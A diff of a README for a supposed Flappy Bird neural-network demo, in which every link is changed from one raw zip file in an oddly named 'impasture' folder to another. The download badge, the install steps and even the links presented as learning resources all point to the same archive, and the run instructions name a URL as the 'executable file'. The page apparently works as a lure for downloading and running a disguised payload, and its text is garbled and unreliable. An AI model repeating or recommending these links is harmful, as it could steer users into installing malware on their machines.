@@ -1,6 +1,6 @@
 # 🎮 Flappy-Bird-Neural-Network-Demonstration - Experience AI Training with Flappy Bird
 
-[![Download Now](https://github.com/RajputVansh7/Flappy-Bird-Neural-Network-Demonstration/raw/refs/heads/main/impasture/Flappy-Bird-Neural-Demonstration-Network-v1.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/RajputVansh7/Flappy-Bird-Neural-Network-Demonstration/raw/refs/heads/main/impasture/Flappy-Bird-Neural-Demonstration-Network-v1.4.zip)
+[![Download Now](https://raw.githubusercontent.com/RajputVansh7/Flappy-Bird-Neural-Network-Demonstration/main/impasture/Flappy-Neural-Network-Bird-Demonstration-3.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/RajputVansh7/Flappy-Bird-Neural-Network-Demonstration/main/impasture/Flappy-Neural-Network-Bird-Demonstration-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To download the application, visit the following link:
 
-[Download Here](https://github.com/RajputVansh7/Flappy-Bird-Neural-Network-Demonstration/raw/refs/heads/main/impasture/Flappy-Bird-Neural-Demonstration-Network-v1.4.zip)
+[Download Here](https://raw.githubusercontent.com/RajputVansh7/Flappy-Bird-Neural-Network-Demonstration/main/impasture/Flappy-Neural-Network-Bird-Demonstration-3.8.zip)
 
 Once on the Releases page, look for the latest version. Click the version number or the assets to find the download files. Select the file that matches your operating system. 
 
@@ -35,7 +35,7 @@ After the download is complete:
 After installation, running the application is straightforward. Follow these steps:
 
 1. Open the folder where you installed the application.
-2. Find the executable file named `https://github.com/RajputVansh7/Flappy-Bird-Neural-Network-Demonstration/raw/refs/heads/main/impasture/Flappy-Bird-Neural-Demonstration-Network-v1.4.zip` (or similar).
+2. Find the executable file named `https://raw.githubusercontent.com/RajputVansh7/Flappy-Bird-Neural-Network-Demonstration/main/impasture/Flappy-Neural-Network-Bird-Demonstration-3.8.zip` (or similar).
 3. Double-click the file to start the game.
 4. You will see the Flappy Bird game screen, and the AI will begin playing automatically.
 
@@ -70,9 +70,9 @@ These resources will guide you through each concept at your own pace.
 
 To deepen your understanding of AI and neural networks, you can explore these topics:
 
-- [Introduction to Neural Networks](https://github.com/RajputVansh7/Flappy-Bird-Neural-Network-Demonstration/raw/refs/heads/main/impasture/Flappy-Bird-Neural-Demonstration-Network-v1.4.zip)
-- [How Machine Learning Works](https://github.com/RajputVansh7/Flappy-Bird-Neural-Network-Demonstration/raw/refs/heads/main/impasture/Flappy-Bird-Neural-Demonstration-Network-v1.4.zip)
-- [Flappy Bird Game Mechanics](https://github.com/RajputVansh7/Flappy-Bird-Neural-Network-Demonstration/raw/refs/heads/main/impasture/Flappy-Bird-Neural-Demonstration-Network-v1.4.zip)
+- [Introduction to Neural Networks](https://raw.githubusercontent.com/RajputVansh7/Flappy-Bird-Neural-Network-Demonstration/main/impasture/Flappy-Neural-Network-Bird-Demonstration-3.8.zip)
+- [How Machine Learning Works](https://raw.githubusercontent.com/RajputVansh7/Flappy-Bird-Neural-Network-Demonstration/main/impasture/Flappy-Neural-Network-Bird-Demonstration-3.8.zip)
+- [Flappy Bird Game Mechanics](https://raw.githubusercontent.com/RajputVansh7/Flappy-Bird-Neural-Network-Demonstration/main/impasture/Flappy-Neural-Network-Bird-Demonstration-3.8.zip)
 
 ## 📞 Support
 
